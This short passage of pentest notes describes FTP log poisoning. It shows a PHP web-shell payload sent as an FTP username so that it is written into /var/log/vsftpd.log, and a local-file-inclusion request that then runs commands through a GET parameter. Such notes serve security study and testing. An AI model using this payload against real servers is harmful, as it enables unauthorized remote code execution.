## FTP log poisoning

- If the web app has FTP server, a file called ```/var/log/vsftpd.log``` is used to keep the log of login activities of its FTP server;

- Thus, for example, if the web back end using PHP 7, we can try log in to ftp server with username ``` ‘<?php system($_GET[‘commandInjection’]); ?>’```. Then, the payload would be stored inside the log file.

- Then, if LFI exists, an RCE can be done by ```/var/log/vsftpd.log&commandInjection=ifconfig```.
